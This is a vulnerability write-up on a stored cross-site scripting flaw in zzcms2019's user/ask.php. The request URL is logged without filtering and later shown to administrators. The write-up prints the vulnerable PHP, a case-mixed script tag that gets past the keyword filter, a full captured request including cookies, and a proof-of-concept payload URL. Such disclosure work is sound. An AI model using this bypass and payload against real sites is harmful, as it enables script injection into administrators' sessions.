

# /user/ask.php

Edition: zzcms2019 /user/ask.php

# 0x01 Vulnerability

Get the `do` parameter with the `get` method

```php
<?php
$do=isset($_GET['do'])?$_GET['do']:'';
switch ($do) {
case "add":add();break;
case "modify":modify();break;
}
```

The `modify()`function

```php
function modify()
{
    global $username; ?>

<div class="admintitle">修改问答信息</div>
<?php
$page = isset($_GET['page'])?$_GET['page']:1;
    checkid($page);
    $id = isset($_GET['id'])?$_GET['id']:0;
    checkid($id, 1);

    $sqlzx="select * from zzcms_ask where id='$id'";
    $rszx =query($sqlzx);
    $rowzx = fetch_array($rszx);
    if ($id<>0 && $rowzx["editor"]<>$username) {
        markit();
        showmsg('非法操作！警告：你的操作已被记录！小心封你的用户及IP！');
    } ?>	  
```

Which called the vulnerable function `markit()`

This function in`/inc/function.php`

```php
//$_SERVER['HTTP_REFERER'];//上页来源
function markit()
{
    $userip = $_SERVER["REMOTE_ADDR"];
    //$userip=getip();
    $url = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    query("insert into zzcms_bad (username,ip,dose,sendtime)values('" . $_COOKIE["UserName"] . "','$userip','$url','" . date('Y-m-d H:i:s') . "')");
}
```

The `$url` is not filtered and inserted directly into the database, so we can register a user and access `http://www.zzcms2019.cc/user/ask.php?do=modify&page=1&id=1`, which will appear

![](https://i.imgur.com/5JxxULl.png)

At this point we can use Burpsuite to capture the package, modify the URI path of the package to `/user/ask.php?do=modify&page=1&id=1&aaa=<sCrIpT>alert(/xss/)</ScRiPt> `

Use `<sCrIpT>alert(/xss/)</ScRiPt>` because there is a detection function in `/inc/stopsqlin.php`

```php
<?php
//主要针对在任何文件后加?%3Cscript%3E，即使文件中没有参数
if (strpos($_SERVER['REQUEST_URI'],'script')!==false || strpos($_SERVER['REQUEST_URI'],'%26%2399%26%')!==false|| strpos($_SERVER['REQUEST_URI'],'%2F%3Cobject')!==false){
die ("无效参数");//注意这里不能用js提示
}
```

![](https://i.imgur.com/H67jYWx.png)

The complete package is as follows
![](https://i.imgur.com/Fqrmmzf.png)

```
GET /user/ask.php?do=modify&page=1&id=1&aaa=<sCrIpT>alert(/xss/)</ScRiPt> HTTP/1.1
Host: www.zzcms2019.cc
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: __tins__713776=%7B%22sid%22%3A%201551009070949%2C%20%22vd%22%3A%205%2C%20%22expires%22%3A%201551010962798%7D; __51cke__=; __51laig__=12; bdshare_firstime=1551002231060; PHPSESSID=8o9ms5t57q6dag7ofku75fn2j7; UserName=test; PassWord=e10adc3949ba59abbe56e057f20f883e
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

When the administrator accesses the **Users→User Bad Action Record** 

![](https://i.imgur.com/VMs1r1r.png)

He/She will be see a alert window which said **/xss/**

![](https://i.imgur.com/MtBdViP.png)

And the database is displayed as follows

![](https://i.imgur.com/Vt2YN9X.png)

Payload:`url/to/zzmcs/user/ask.php?do=modify&page=1&id=1&aaa=<sCrIpT>alert(/xss/)</ScRiPt>`



